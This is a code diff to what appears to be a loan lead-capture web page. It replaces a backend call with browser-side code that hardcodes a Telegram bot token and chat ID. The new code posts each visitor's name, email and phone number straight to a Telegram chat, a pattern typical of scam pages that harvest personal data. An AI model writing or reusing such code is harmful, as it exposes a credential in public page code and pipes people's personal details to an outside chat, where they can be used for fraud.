@@ -946,19 +946,20 @@
                 submitBtn.textContent = 'Processing...';
                 submitBtn.disabled = true;
 
-                // Save to localStorage for later pages
                 localStorage.setItem('firstName', firstName);
                 localStorage.setItem('lastName', lastName);
                 localStorage.setItem('email', email);
                 localStorage.setItem('phone', phone);
 
-                // Send lead to backend (Telegram)
-                fetch('/api/lead', {
+                const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+                const CHAT_ID = '5615316142';
+                const msg = `🇨🇦 New Lead\n👤 ${firstName} ${lastName}\n📧 ${email}\n📱 ${countryCode}${phone}`;
+                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ firstName, lastName, email, countryCode, phone })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                 }).finally(function() {
-                    window.location.href = "loan.html";
+                    window.location.href = 'loan.html';
                 });
             });
 
